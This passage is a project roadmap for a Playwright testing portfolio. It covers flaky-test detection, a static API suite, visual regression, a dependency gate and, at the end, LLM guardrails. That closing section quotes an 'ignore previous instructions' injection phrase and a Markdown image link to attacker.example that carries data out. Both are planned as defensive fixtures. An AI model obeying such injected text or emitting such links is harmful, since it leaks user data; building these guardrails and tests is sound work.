2. Works offline from committed fixtures or `playwright-report` / result JSON — no API keys.

### Future Playwright / unit test cases

| ID | Scenario |
|---|---|
| P4-M2-01 | Fixture with retry-then-pass is reported as flaky |
| P4-M2-02 | Always-failing test is not classified as flaky |
| P4-M2-03 | Missing report path exits with a clear error |

### Implementation scope

- Parse Playwright JSON report / result files
- Heuristic: failed then passed within retries → flaky candidate
- Markdown (and optional HTML) summary under `ai-reports/` or stdout
- npm script e.g. `npm run analyze:flaky`

### Acceptance criteria

- [x] Offline CLI with unit tests
- [x] Clear flaky vs hard-fail distinction
- [x] Documented in README / TESTING

### Implementation notes

Summary:

- Added `ai/flaky-detector/` with `analyzeFlakyReport()`, Markdown report generator, and `npm run analyze:flaky`.
- Enabled Playwright JSON reporter → `test-results/playwright-results.json`.
- Fixtures cover flaky, hard-fail, and all-pass; 4 unit tests included in `npm run test:ai`.

Architectural decisions:

- Prefer Playwright JSON `status: flaky | unexpected` with attempt-history fallback.
- Default input path is `test-results/playwright-results.json` so CI artifact downloads work without extra flags.

---

## Phase 4 — Milestone Dependency Graph

```text
Phase 3 complete
 └── P4-M1 Fix Checkout Place-Order Navigation Race
      └── P4-M2 Flaky Test Detection CLI
```

---

## Phase 4 — Progress Summary

| Milestone | Status | Completed |
|---|---|---|
| P4-M1 — Fix Checkout Place-Order Navigation Race | ✅ Completed | 2026-07-20 |
| P4-M2 — Flaky Test Detection CLI | ✅ Completed | 2026-07-20 |

**Phase 4 status: ✅ Complete** — checkout flake fix and flaky detection delivered (2026-07-20).

### Phase 4 — Completion Summary

- **P4-M1** — Place order navigates before cart clear; POM waits for confirmation + empty cart badge
- **P4-M2** — `npm run analyze:flaky` parses Playwright JSON for flaky vs hard-fail outcomes

---

# Phase 5 — API Testing

**Status:** ✅ Completed  
**Completed:** 2026-07-23  
**Current focus:** —

### Goal

Add portfolio-quality **Playwright API testing** without introducing a database or auth server. Serve read-only JSON contracts from Vite `public/api/`, consume them from the app, and validate them with `APIRequestContext`.

### Why this shape

- Project constraint: **no backend / no database**
- Catalogue is served over HTTP (`/api/*.json`) and loaded by the React app via `fetch`
- Playwright’s `request` fixture exercises the same contract without driving the UI
- Static files under `public/api/` are a realistic “contract layer” SDETs test in many frontends

### Design principles

- Keep API read-only and deterministic (JSON fixtures)
- Prefer schema/status/header assertions over UI
- Tag API suite `@api` and run separately from smoke/e2e
- Do not add external auth providers or a real database

---

## P5-M1 — Static API Contract and Fixtures

**Status:** ✅ Completed  
**Completed:** 2026-07-20  
**Dependencies:** Phase 1 data files

### Goal

Expose stable HTTP JSON endpoints for products (and related catalog data) via Vite static files.

### User scenarios

1. Engineer opens `/api/products.json` locally and receives the product catalogue JSON.
2. Invalid API path returns Vite/static 404 (documented expected behaviour).

### Future Playwright / API test cases

| ID | Scenario |
|---|---|
| P5-M1-01 | `GET /api/products.json` returns 200 and JSON content-type |
| P5-M1-02 | Payload includes expected product fields (`slug`, `name`, `price`, …) |
| P5-M1-03 | Unknown `/api/...` path is not 200 |

### Accessibility requirements

- N/A (HTTP contract; no UI)

### Stable locator strategy

- N/A — use Playwright `request` / URL paths, not DOM locators

### Edge cases

- Empty catalogue file
- Malformed JSON must fail CI if committed broken
- Keep secrets out of public API (demo password stays documentation-only or hashed pattern — prefer not exposing credentials via `/api`)

### Implementation scope

- Add `app/public/api/` JSON fixtures derived from existing app data
- Document endpoints in `docs/TESTING.md`
- Do not yet require the React app to fetch (optional in P5-M2)

### Acceptance criteria

- [x] `/api/products.json` served by Vite in local/CI runs
- [x] Contract documented
- [x] No real backend process added

### Implementation notes

Summary:

- Added `app/public/api/products.json` and `featured-products.json` (static Vite assets).
- Documented contract in `app/public/api/README.md` and `docs/TESTING.md`.
- Auth/users intentionally omitted from public API.

Architectural decisions:

- Static files keep the “no backend” constraint while enabling Playwright `request` testing.
- Catalogue seed remains in `src/data/products.json` for tests/reference; runtime source of truth is `public/api/`.

---

## P5-M2 — App Data Access via `/api` (Optional Client)

**Status:** ✅ Completed  
**Completed:** 2026-07-23  
**Dependencies:** P5-M1

### Goal

Load catalogue (and safe public metadata) through `fetch('/api/...')` so UI and API share one contract.

### User scenarios

1. Products page still renders the same catalogue after switching to fetch-based loading.
2. Loading/error states are testable if fetch fails (mocked).

### Future Playwright test cases

| ID | Scenario |
|---|---|
| P5-M2-01 | Products page lists items when `/api/products.json` succeeds |
| P5-M2-02 | Route mock failure shows a clear empty/error state (if implemented) |

### Implementation scope

- Thin `app/src/api/` client
- Prefer products first; keep auth local (Local Storage) — **do not** publish demo passwords via public API
- Preserve existing smoke/e2e behaviour

### Acceptance criteria

- [x] Catalogue loads via HTTP in the running app
- [x] Existing `@smoke` / `@e2e` suites still pass
- [x] Auth remains Local Storage–based (no API login server)

### Implementation notes

Summary:

- Added `app/src/api/productsApi.ts` with shape validation for catalogue responses.
- `ProductsProvider` + `ProductsGate` load `/api/products.json`, expose loading (`role="status"`) and error (`role="alert"` + Try again).
- Home, products, and product detail pages consume context instead of sync JSON imports.
- Auth stays Local Storage–only; no users endpoint under `/api`.

Architectural decisions:

- One HTTP contract for UI and `@api` tests.
- Featured products derived from catalogue `featured` flags (query `?featured=none` still forces empty featured UI for smoke).

---

## P5-M3 — Playwright API Test Suite

**Status:** ✅ Completed  
**Completed:** 2026-07-23  
**Dependencies:** P5-M1 (P5-M2 optional)

### Goal

Add a dedicated `@api` suite using Playwright `request` (no browser UI required for core checks).

### User scenarios

1. `npm run test:api` validates catalogue contract in CI without driving the UI.
2. Failures show clear status/body assertion messages.

### Future Playwright test cases

| ID | Scenario |
|---|---|
| P5-M3-01 | Products list status 200 + array length ≥ 1 |
| P5-M3-02 | Each product has required fields and unique slugs |
| P5-M3-03 | Featured/home subset (if exposed) matches contract rules |
| P5-M3-04 | 404 for missing API resource |

### Implementation scope

- `tests/api/` specs tagged `@api`
- npm script `test:api`
- Optional Playwright project with `request` only (or reuse default project)
- CI job or matrix entry for API tests

### Acceptance criteria

- [x] `npm run test:api` documented and green locally
- [x] CI runs API tests
- [x] Assertions cover status, content-type, and schema basics

### Implementation notes

Summary:

- Added `tests/api/products-api.spec.ts` (`@api`) covering status, content-type, schema, featured subset, and JSON 404.
- `npm run test:api` and CI matrix suite `api` alongside smoke/e2e.

Architectural decisions:

- Reuse default Playwright project + `request` fixture (webServer still starts Vite so `/api` is reachable).
- Keep API suite tag-filtered so UI suites stay focused.

---

## P5-M4 — API Docs Polish and Negative Coverage

**Status:** ✅ Completed  
**Completed:** 2026-07-23  
**Dependencies:** P5-M3

### Goal

Polish docs, expand negative/contract edge cases, and mark Phase 5 complete.

### User scenarios

1. Engineer runs `npm run test:api` from docs and validates the catalogue contract.
2. Nested missing `/api` paths still return JSON 404 (not SPA HTML).
3. POST/PUT-style calls to `/api` are rejected as read-only.
4. Shopper sees a clear error and can retry when catalogue fetch fails.

### Playwright / API test cases

| ID | Scenario |
|---|---|
| P5-M4-01 | Nested missing API path returns JSON 404 with path |
| P5-M4-02 | API 404 body is JSON, not SPA HTML |
| P5-M4-03 | POST to products API returns JSON 405 |
| P5-M4-04 | Products page shows alert when catalogue fetch fails |
| P5-M4-05 | Try again reloads catalogue after a failed fetch |

### Accessibility requirements

- Catalogue error uses `role="alert"` and a clearly named **Try again** button
- Loading state remains `role="status"`

### Stable locator strategy

- API: Playwright `request` + URL paths / status / headers / JSON body
- UI: `getByRole('alert')`, `getByRole('button', { name: 'Try again' })`, product `article` by name

### Edge cases

- React StrictMode double-fetch during retry tests (fail until retry is clicked)
- Vite static middleware previously returned 200 for POST — now JSON 405

### Implementation scope

- README / TESTING API section with one-command flow
- Roadmap completion summary
- Extra negatives (404 HTML guard, nested path, method rejection)
- Smoke coverage for fetch failure UI

### Acceptance criteria

- [x] Documented one-command API test flow
- [x] Phase 5 milestones marked complete where delivered

### Implementation notes

Summary:

- Documented `npm run test:api` in `docs/TESTING.md`, `app/public/api/README.md`, and README.
- Extended `@api` negatives: nested 404, non-HTML body, POST → 405.
- Vite middleware rejects non-GET/HEAD `/api` with JSON 405 + `Allow`.
- Added smoke specs for catalogue fetch failure + Try again recovery.
- Marked Phase 5 complete.

Architectural decisions:

- Treat `/api` as a read-only contract in middleware (not only in docs).
- Keep fetch-failure coverage in `@smoke` so CI UI matrix exercises `ProductsGate`.

---

## Phase 5 — Milestone Dependency Graph

```text
Phase 4 complete
 └── P5-M1 Static API Contract and Fixtures
      ├── P5-M2 App Data Access via /api (optional client)
      └── P5-M3 Playwright API Test Suite
           └── P5-M4 API Docs Polish and Negative Coverage
```

---

## Phase 5 — Progress Summary

| Milestone | Status | Completed |
|---|---|---|
| P5-M1 — Static API Contract and Fixtures | ✅ Completed | 2026-07-20 |
| P5-M2 — App Data Access via `/api` | ✅ Completed | 2026-07-23 |
| P5-M3 — Playwright API Test Suite | ✅ Completed | 2026-07-23 |
| P5-M4 — API Docs Polish and Negative Coverage | ✅ Completed | 2026-07-23 |

### Phase 5 — Completion Summary

- **P5-M1** — Static `/api` JSON fixtures + JSON 404 middleware
- **P5-M2** — App loads catalogue via `fetch` (`ProductsProvider`)
- **P5-M3** — Playwright `@api` suite + CI matrix
- **P5-M4** — Docs polish, 405/404 negatives, catalogue error UI smoke

---

# Phase 6 — Visual Regression

**Status:** ✅ Completed  
**Completed:** 2026-08-08  
**Current focus:** —

### Goal

Add portfolio-quality **visual regression** using Playwright’s built-in screenshot assertions (no external visual SaaS).

### Design principles

- Native `toHaveScreenshot` only (no Percy/Argos/Chromatic)
- Tag suite `@visual` and run separately from smoke/e2e/api
- Commit baselines to git for deterministic CI
- Chromium desktop only (`1280x720`) to limit baseline sprawl
- Disable animations; wait for catalogue-ready UI before capture
- Skip dynamic order-confirmation pages (or mask later)

---

## P6-M1 — Visual harness + first baselines

**Status:** ✅ Completed  
**Completed:** 2026-08-08  
**Dependencies:** Phase 5

### Goal

Wire visual config, scripts, docs, and first home/products baselines.

### User scenarios

1. Engineer runs `npm run test:visual` and compares against committed baselines.
2. Home and products pages are captured after catalogue content is visible.

### Playwright test cases

| ID | Scenario |
|---|---|
| P6-M1-01 | Home page full-page snapshot matches baseline |
| P6-M1-02 | Products catalogue snapshot matches baseline |

### Accessibility / locators

- Navigate/wait with POM + `getByRole`; screenshot is the assertion

### Edge cases

- Loading flash before `/api/products.json` resolves
- Animation/hover noise

### Acceptance criteria

- [x] `tests/visual/` + `test:visual`
- [x] Screenshot config (`animations: 'disabled'`, diff tolerance)
- [x] Documented update workflow

### Implementation notes

- `expect.toHaveScreenshot` defaults in `playwright.config.ts`
- Fixed viewport via `test.use` in visual specs
- Snapshot path omits OS platform segment so one baseline set is shared; diffs tuned with `maxDiffPixelRatio`

---

## P6-M2 — Core marketing/auth surfaces

**Status:** ✅ Completed  
**Completed:** 2026-08-08  
**Dependencies:** P6-M1

### Goal

Cover product detail, login, and empty cart.

### Playwright test cases

| ID | Scenario |
|---|---|
| P6-M2-01 | Product detail (sample slug) snapshot |
| P6-M2-02 | Login page snapshot |
| P6-M2-03 | Empty cart snapshot |

### Acceptance criteria

- [x] Three additional `@visual` snapshots using existing POM/data

---

## P6-M3 — Stateful flows + CI

**Status:** ✅ Completed  
**Completed:** 2026-08-08  
**Dependencies:** P6-M2

### Goal

Cart-with-item and checkout snapshots; CI matrix; Phase 6 complete.

### Playwright test cases

| ID | Scenario |
|---|---|
| P6-M3-01 | Cart with sample product snapshot |
| P6-M3-02 | Checkout form (logged in, cart seeded) snapshot |

### Acceptance criteria

- [x] Stateful visual specs
- [x] CI `visual` matrix entry
- [x] README / roadmap Phase 6 complete

### Implementation notes

- Reuse `loginViaUi` + `addSampleProductToCart` helpers
- Baselines generated for Chromium; update with `npm run test:visual -- --update-snapshots` when UI intentionally changes

---

## Phase 6 — Milestone Dependency Graph

```text
Phase 5 complete
 └── P6-M1 Visual harness + first baselines
      └── P6-M2 Core marketing/auth surfaces
           └── P6-M3 Stateful flows + CI
```

---

## Phase 6 — Progress Summary

| Milestone | Status | Completed |
|---|---|---|
| P6-M1 — Visual harness + first baselines | ✅ Completed | 2026-08-08 |
| P6-M2 — Core marketing/auth surfaces | ✅ Completed | 2026-08-08 |
| P6-M3 — Stateful flows + CI | ✅ Completed | 2026-08-08 |

### Phase 6 — Completion Summary

- **P6-M1** — `@visual` harness, home/products baselines, docs
- **P6-M2** — Detail, login, empty cart snapshots
- **P6-M3** — Cart/checkout snapshots + CI matrix

---

# Phase 7 — Historical Failure Trends

**Status:** ✅ Completed  
**Completed:** 2026-08-09  
**Current focus:** —

### Goal

Track suite outcomes over time with an offline JSONL history and Markdown trend reports (top failing tests, flaky hotspots, category totals).

### Design principles

- No database / no GitHub API dependency
- Append-only JSONL under gitignored `ai-reports/history/`
- Reuse flaky-detector Playwright JSON parsing
- Light category tagging via existing failure-analyzer heuristics
- Committed fixtures so demos work without a long local history

---

## P7-M1 — History store + record CLI

**Status:** ✅ Completed  
**Completed:** 2026-08-09  
**Dependencies:** Phase 4 (flaky detector)

### Goal

Append one run snapshot per Playwright JSON report to JSONL history.

### User scenarios

1. Engineer records a suite after Playwright writes `playwright-results.json`.
2. Multiple records append without corrupting prior lines.

### Test cases

| ID | Scenario |
|---|---|
| P7-M1-01 | Record builds valid JSONL from fixture Playwright JSON |
| P7-M1-02 | Second record appends a new line |

### Acceptance criteria

- [x] `recordRunFromReport` / `npm run analyze:trends -- --record`
- [x] Default history `ai-reports/history/runs.jsonl`
- [x] Unit tests green

---

## P7-M2 — Trend report

**Status:** ✅ Completed  
**Completed:** 2026-08-09  
**Dependencies:** P7-M1

### Goal

Aggregate history into a Markdown trend report.

### Test cases

| ID | Scenario |
|---|---|
| P7-M2-01 | Report ranks recurring unexpected tests |
| P7-M2-02 | Report shows flaky hotspots / category totals |
| P7-M2-03 | Empty history → clear empty report |

### Acceptance criteria

- [x] `npm run analyze:trends` writes `ai-reports/trends.md`
- [x] Fixture demo history committed

---

## P7-M3 — Docs + polish

**Status:** ✅ Completed  
**Completed:** 2026-08-09  
**Dependencies:** P7-M2

### Goal

Document the module and mark Phase 7 complete.

### Acceptance criteria

- [x] Module README + root README / roadmap updates
- [x] Future Enhancements checklist updated

---

## Phase 7 — Milestone Dependency Graph

```text
Phase 4 flaky detector
 └── P7-M1 History store + record CLI
      └── P7-M2 Trend report
           └── P7-M3 Docs + polish
```

---

## Phase 7 — Progress Summary

| Milestone | Status | Completed |
|---|---|---|
| P7-M1 — History store + record CLI | ✅ Completed | 2026-08-09 |
| P7-M2 — Trend report | ✅ Completed | 2026-08-09 |
| P7-M3 — Docs + polish | ✅ Completed | 2026-08-09 |

### Phase 7 — Completion Summary

- **P7-M1** — JSONL append from Playwright JSON (`analyze:trends --record`)
- **P7-M2** — Markdown trends (top fails, flaky hotspots, categories)
- **P7-M3** — Docs and Phase 7 marked complete

---

# Phase 8 — AI Run / PR Summaries

**Status:** ✅ Completed  
**Completed:** 2026-08-10  
**Current focus:** —

### Goal

Produce interview-friendly **Markdown run summaries** for failing/passing `@smoke` / `@e2e` / `@api` / `@visual` suites, reusable locally and as sticky PR comments. Reuse flaky detector + failure classifier (no LLM required).

### Design principles

- Offline-first CLI (`npm run analyze:summary`)
- Multi-suite input via `--suite <name> <json>`
- Compact Markdown suitable for GitHub PR comments
- CI uploads JSON always; PR job posts/updates one sticky comment

### User scenarios

1. Engineer summarizes one or more local Playwright JSON reports into Markdown.
2. On a PR, CI posts a single updated summary comment after matrix jobs finish.
3. Hard failures include classifier categories (timeout/assertion/…).

### Test cases

| ID | Scenario |
|---|---|
| P8-M1-01 | Hard-fail suite summary includes classifier category |
| P8-M1-02 | Multi-suite merge surfaces flaky overall status |
| P8-M1-03 | All-pass suite → overall `passed` |
| P8-M1-04 | Empty input → empty overall status |

### Acceptance criteria

- [x] `ai/run-summary/` module + unit tests
- [x] `npm run analyze:summary`
- [x] CI JSON artifacts + PR summary comment job
- [x] Docs / README checklist

---

## Phase 8 — Milestone Dependency Graph

```text
Phase 3 classifier + Phase 4 flaky detector
 └── P8-M1 Run summary Markdown CLI
      └── P8-M2 CI PR comment integration
           └── P8-M3 Docs polish
```

---

## Phase 8 — Progress Summary

| Milestone | Status | Completed |
|---|---|---|
| P8-M1 — Run summary Markdown CLI | ✅ Completed | 2026-08-10 |
| P8-M2 — CI PR comment integration | ✅ Completed | 2026-08-10 |
| P8-M3 — Docs polish | ✅ Completed | 2026-08-10 |

### Phase 8 — Completion Summary

- **P8-M1** — `analyze:summary` multi-suite Markdown builder
- **P8-M2** — Always-upload JSON artifacts + sticky PR comment job
- **P8-M3** — Module README + roadmap/README updates

---

# Phase 9 — Dependency Gate

**Status:** ✅ Completed  
**Completed:** 2026-11-07  
**Current focus:** —

### Goal

Cheap first gate before the AI-specific work: make CI installs reproducible and stop hallucinated, brand-new or vulnerable packages from entering the repo (supply chain risk, OWASP LLM03 when the dependency was suggested by AI).

### Design principles

- `npm ci` everywhere: the lockfile is the source of truth
- Only **new** dependencies are checked; version bumps are left to Renovate + audit
- One bot for version updates (Renovate), GitHub-native alerts for vulnerabilities (Dependabot alerts); never two bots opening PRs for the same update
- Clear failure message naming the package and the rule it broke

### User scenarios

1. A PR adds a package that doesn't exist on npm or was published last week → CI fails with the reason.
2. A PR introduces a dependency with a known high-severity advisory → audit fails.
3. Renovate opens grouped weekly PRs (npm, GitHub Actions, `.nvmrc`) only for versions older than the waiting period; the existing suites validate them.
4. A low-risk devDependency patch passes all four CI suites → Renovate auto-merges it.
5. A vulnerable dependency shows up in the repo's Security tab via a Dependabot alert, even between Renovate runs.

### Why Renovate + Dependabot alerts

Two different jobs, each handled by the tool that does it best:

| Job | Tool | Why this one |
|---|---|---|
| Version updates (PRs) | **Renovate** | `minimumReleaseAge` holds back brand-new releases for a few days, the window in which compromised or broken versions are usually caught and pulled, so it complements the new-package age check in P9-M1. It also groups related updates (e.g. all Playwright packages in one PR), auto-merges low-risk updates once CI is green, and picks up `app/package.json`, `.nvmrc` and GitHub Actions versions with no extra setup. The Dependency Dashboard issue gives one view of everything pending. |
| Vulnerability alerts | **Dependabot alerts** | GitHub-native: alerts are based on the GitHub Advisory Database and appear in the repo's Security tab with no extra service. They work even if Renovate is paused or misconfigured. |
| Dependabot version updates | ❌ Off | Would duplicate Renovate's PRs for the same packages. |

Trade-off: Renovate needs the Mend Renovate GitHub App installed on the repo (free) and is one more external service. Dependabot alone is zero-setup, but its grouping, release-age and auto-merge options are less mature.

---

## P9-M1 — CI hygiene + new-dependency gate

**Status:** ✅ Completed  
**Completed:** 2026-11-06  
**Dependencies:** Phase 2 CI

### Implementation scope

- CI: `npm install` → `npm ci` in all jobs; `npm audit --audit-level=high`
- `ai/dep-gate/`: diff `package.json` + `app/package.json` against the PR base; for each **new** dependency, check that it exists on the registry, its age (`time.created`), and its weekly downloads; fail below the thresholds
### Test cases

| ID | Scenario |
|---|---|
| P9-M1-01 | No new deps → pass |
| P9-M1-02 | Unknown package (registry 404, mocked) → fail with name |
| P9-M1-03 | Package younger than threshold → fail |
| P9-M1-04 | Version bump of existing dep → not treated as new |
| P9-M1-05 | Weekly downloads below threshold → fail with name |

### Acceptance criteria

- [x] All CI jobs install with `npm ci` (root, and `app/` where the job needs it)
- [x] `npm audit --audit-level=high` on root and `app/` in CI
- [x] `ai/dep-gate/` checks only new dependency names (registry, age, weekly downloads)
- [x] Unit tests P9-M1-01 through P9-M1-05

### Implementation notes

**Summary:** CI no longer runs `npm install`. Playwright, summary, and AI unit jobs use `npm ci`. Pull requests run `npm run analyze:deps`, which diffs `package.json` and `app/package.json` against the PR base and checks each new package on the npm registry. Thresholds are 7 days old and at least 1000 weekly downloads. Existing high-severity advisories in `app/package-lock.json` were updated with `npm audit fix` so the audit gate is green on the current tree.

**Architectural decisions:**
- The gate compares dependency names, not versions. Version bumps stay with audit and, later, Renovate.
- Registry access is injected (`lookup`) so unit tests never call npm. The CLI uses the real registry.
- A package is new when its name is absent from that manifest's `dependencies`, `devDependencies`, and `optionalDependencies` on the base ref.
- Audit runs on pushes (`ai-unit`) and on pull requests (`dep-gate`). The new-package check runs on pull requests only, because it needs a base ref.

**Deviations:**
- Added P9-M1-05. The milestone scope requires a weekly-download floor, and the original table only listed existence, age, and version bumps.
- `npm run setup` is unchanged for local installs. Only CI jobs switched to `npm ci`.
- `app/package-lock.json` was refreshed so existing high advisories do not fail the new audit step. `app/package.json` ranges were not changed.

**Tests implemented:** P9-M1-01–P9-M1-05 in `ai/dep-gate/gate.test.mts`.

### How to test

Same steps as the README section **Dependency gate**.

| What you want to see | Command | Expected |
|---|---|---|
| No new packages | `npm run analyze:deps -- --base HEAD` | `Dependency gate passed.` |
| Unknown package | `npm pkg set dependencies.not-a-real-package-xyz=1.0.0`, then `npm run analyze:deps -- --base HEAD`, then `git checkout -- package.json` | Failure names `not-a-real-package-xyz` and `not found on the npm registry` |
| Offline cases (404, age, downloads, version bump) | `node --experimental-strip-types --test ai/dep-gate/gate.test.mts` | P9-M1-01 through P9-M1-05 pass |
| Pull request | Open a PR | Job **New dependency gate** runs `analyze:deps` against the base SHA. `ai-unit` runs `npm audit --audit-level=high` on push and on pull request |

A new package also fails when `time.created` is under 7 days or weekly downloads are under 1000. Changing the version of a package that already exists on the base does not fail this check.

## P9-M2 — Renovate config + Dependabot alerts

**Status:** ✅ Completed  
**Completed:** 2026-11-06  
**Dependencies:** P9-M1

### Implementation scope

- `renovate.json` (each rule commented in the PR / docs):
  - `config:recommended` + Dependency Dashboard
  - `minimumReleaseAge` (e.g. 3 days) for npm
  - group `@playwright/test` and Playwright-related packages; group non-major devDependency updates into one weekly PR
  - auto-merge devDependency patch/minor updates when all required CI checks pass; majors always need manual review
  - cover root `package.json`, `app/package.json`, `.nvmrc`, GitHub Actions
- Install the Mend Renovate GitHub App on the repo (manual step, owner only)
- Repo settings: Dependabot **alerts** on; Dependabot **version updates** off (no `.github/dependabot.yml`)
- Validate config in CI with `renovate-config-validator`

### Test cases

| ID | Scenario |
|---|---|
| P9-M2-01 | `renovate-config-validator` passes in CI |
| P9-M2-02 | Onboarding PR / Dependency Dashboard lists both package files, `.nvmrc` and Actions |
| P9-M2-03 | A Playwright update arrives as one grouped PR |
| P9-M2-04 | A release younger than `minimumReleaseAge` shows as pending, not as a PR |
| P9-M2-05 | No Dependabot version-update PRs are opened |

### Acceptance criteria

- [x] `renovate.json` uses `config:recommended`, the Dependency Dashboard, a 3-day npm wait, a Playwright group, a weekly non-major devDependency group, and automerge only for patch/minor devDependencies
- [x] `renovate-config-validator` passes locally and is a CI job
- [x] Mend Renovate app installed (owner, Renovate Only, Scan and Alert)
- [x] Dependabot alerts on; security updates, grouped security updates, and version updates off
- [x] No `.github/dependabot.yml`

### How to test

| What you want to see | Command or place | Expected |
|---|---|---|
| Config is valid | CI job **Renovate config**, or `npx --yes --package renovate@44.221.5 renovate-config-validator` | `Config validated successfully` |
| Rules stay in place | `node --experimental-strip-types --test ai/dep-gate/renovate-config.test.mts` | All cases pass |
| Dashboard lists both package files, `.nvmrc`, and Actions | After this config is on `main`, the Renovate Dependency Dashboard issue | Same four files the onboarding PR already detected |
| A brand-new npm release is held back | Dependency Dashboard, for 3 days after publish | Shown as pending, not opened as a pull request |
| No Dependabot version PRs | Pull requests list | No pull request from `dependabot` |

Do not merge onboarding pull request #5. It only contains `config:recommended`. Merging this milestone's `renovate.json` replaces it. Close #5 once that file is on `main`.

### Implementation notes

**Summary:** `renovate.json` keeps Renovate on the recommended preset and states the repo rules in `description` fields. npm updates wait 3 days. `@playwright/test`, `playwright`, and `playwright-core` share one pull request. Other non-major devDependency updates are grouped into one Monday pull request. Patch and minor devDependency updates automerge after required CI checks pass. Major updates do not. CI validates the file with Renovate 44.221.5 on Node 24. The Mend app and the Dependabot settings were turned on by hand.

**Architectural decisions:**
- `minimumReleaseAge` is an npm package rule, not a global setting, so GitHub Actions and `.nvmrc` are not delayed.
- Playwright is excluded from the weekly devDependency group with negated `matchPackageNames`, which is the current Renovate form of `excludePackageNames`.
- `separateMajorMinor` stays at its default, so a Playwright major does not sit in the same pull request as a Playwright minor.
- Automerge uses Renovate's own merge, which waits for required status checks. It does not use GitHub's auto-merge button.
- The validator job uses Node 24 because Renovate 44 does not support Node 22. The rest of CI stays on `.nvmrc`.

**Deviations:**
- Root `package.json`, `app/package.json`, `.nvmrc`, and GitHub Actions are covered by Renovate's default managers. The onboarding PR already detected all four, so the config does not set `enabledManagers`.
- P9-M2-02, P9-M2-03, and P9-M2-04 can be confirmed only after this file is on `main` and Renovate runs. The local test locks the rules that produce that behavior.
- The prose "Dependency updates" section in `docs/TESTING.md` remains P9-M3. Each rule is described inside `renovate.json`.

**Tests implemented:** `ai/dep-gate/renovate-config.test.mts`.

## P9-M3 — Docs

**Status:** ✅ Completed  
**Completed:** 2026-11-06  
**Dependencies:** P9-M1, P9-M2

- `docs/TESTING.md`: "CI gates" table started here (gate, trigger, threshold, how to fix); Phase 11 extends it
- README: dependency gate and Renovate listed under tooling
- `docs/TESTING.md`: short "Dependency updates" section summarising the Renovate + Dependabot alerts split

### Acceptance criteria

- [x] All CI jobs use `npm ci` (P9-M1)
- [x] `npm audit --audit-level=high` in CI (P9-M1)
- [x] New-dependency gate with unit tests (P9-M1)
- [x] Renovate config validated in CI; app installed (P9-M2)
- [x] Dependabot alerts on, version updates off (P9-M2)
- [x] Gate and Renovate rationale documented (P9-M3)
- [x] Playwright matrix reuses a browser install (P9-M4)
- [x] CI test workers raised above 1 (P9-M4). Confirm the smoke suite stays green on the pull request.
- [x] Renovate validator and `npm audit` run only where they are needed (P9-M4)

## P9-M4 — Faster CI

**Status:** ✅ Completed  
**Completed:** 2026-11-07  
**Dependencies:** P9-M1. The Renovate path filter also needs P9-M2.

### Goal

Shorten the pull-request pipeline without dropping suites, retries, or the dependency gate. The four Playwright jobs currently repeat browser download and OS library install, then run tests one at a time.

### Design principles

- A green run should do the expensive install work once per Playwright version, not once per suite.
- Retries stay at 2. They cost time only when a test fails, and the flaky detector needs them.
- Skip work that cannot affect the files in the change.

### Implementation scope

- Reuse the Chromium install across matrix jobs. Prefer the official Playwright image whose tag matches the installed `@playwright/test` version. A cache of `.playwright-browsers` is the alternative, and it still runs `playwright install-deps`.
- Raise `workers` above 1 when `CI=true`, starting at 2. Watch the smoke suite for new flakes before going higher.
- Cache both lockfiles in `actions/setup-node` (`package-lock.json` and `app/package-lock.json`).
- Run `npm audit` in one job. `dep-gate` fetches only the PR base commit, not the full history.
- Run the Renovate validator only when `renovate.json` changes.
- Cancel an in-progress run on a pull request when a newer commit is pushed.
- Skip every test job when a pull request only changes `docs/**` or Markdown files. A push to `main` still runs CI. Implemented in `scripts/should-run-ci.mjs`.

### Test cases

| ID | Scenario |
|---|---|
| P9-M4-01 | A second suite job does not download Chromium again when the Playwright version is unchanged |
| P9-M4-02 | Smoke tests pass on CI with `workers` greater than 1 |
| P9-M4-03 | A pull request that only edits `docs/` or Markdown does not run the test jobs |
| P9-M4-04 | A pull request that does not change `renovate.json` does not run the Renovate validator |
| P9-M4-05 | Pushing a new commit to an open pull request cancels the older run |

### How to judge it

Compare the **Playwright (smoke)** job before and after on a green pull request. Setup time and test time should both drop. The suite list, `retries: 2`, and the dependency gate stay.

---

## Phase 9 — Milestone Dependency Graph

```text
Phase 2 CI
 ├── P9-M1 CI hygiene + new-dependency gate
 └── P9-M2 Renovate config + Dependabot alerts
      ├── P9-M3 Docs
      └── P9-M4 Faster CI
```

## Phase 9 — Progress Summary

| Milestone | Status | Completed |
|---|---|---|
| P9-M1 — CI hygiene + new-dependency gate | ✅ Completed | 2026-11-06 |
| P9-M2 — Renovate config + Dependabot alerts | ✅ Completed | 2026-11-06 |
| P9-M3 — Docs | ✅ Completed | 2026-11-06 |
| P9-M4 — Faster CI | ✅ Completed | 2026-11-07 |

---

# Phase 10 — LLM Guardrails

**Status:** ✅ Completed  
**Completed:** 2026-11-07  
**Current focus:** —

### Goal

Treat the optional LLM step in the Failure Analyzer as untrusted, following the **OWASP Top 10 for LLM Applications**. Failure context (error text, page content) is attacker-controllable input. LLM output is untrusted text that ends up in HTML reports, Markdown reports and PR comments. Prove every guardrail with a fixture and a unit test.

### Current state (baseline)

- ✅ HTML report escapes all LLM fields (`escapeHtml` in `report.mts`)
- ✅ `parseSuggestionPayload` type-checks `summary` / `hypotheses` / `caveats` and falls back to `null`
- ⚠️ Markdown report (`markdownSuggestionSection`) inserts LLM text raw → links, images and inline HTML render on GitHub / in IDEs
- ⚠️ No length or count caps on LLM fields
- ⚠️ Error context is sent to the provider as-is, with no secret redaction

### Design principles

- Offline-first: every guardrail is testable with fixtures and a fake `fetchImpl`, so no API key is needed
- Defence in depth: validate input → constrain prompt → validate output → encode for each sink (HTML, Markdown)
- Fail closed: invalid LLM output → `null` → heuristic report still renders
- Map each guardrail to an OWASP LLM ID in docs

### User scenarios

1. A failing test whose page text contains "ignore previous instructions…" still produces a sane, heuristic-anchored report.
2. An LLM response containing `![x](https://attacker.example/?d=...)` renders as inert text in Markdown and PR comments.
3. A `Bearer` token or `.env`-style secret in error context never leaves the machine.
4. An oversized or malformed LLM response is rejected and the report falls back to heuristics.

---

## P10-M1 — Adversarial fixtures (LLM01 Prompt Injection)

**Status:** ✅ Completed  
**Completed:** 2026-11-07

### Implementation scope

- `ai/failure-analyzer/fixtures/prompt-injection/` — `error-context.md` with injected instructions (plain, hidden in a Markdown comment, in a fake "assistant" turn)
- Wrap failure context in explicit delimiters in `buildRootCausePrompt`, and state in `SYSTEM_PROMPT` that the delimited block is data, not instructions
- Fake-provider tests: a provider that "obeys" the injection must still be caught by output validation (P10-M2)

### Test cases

| ID | Scenario |
|---|---|
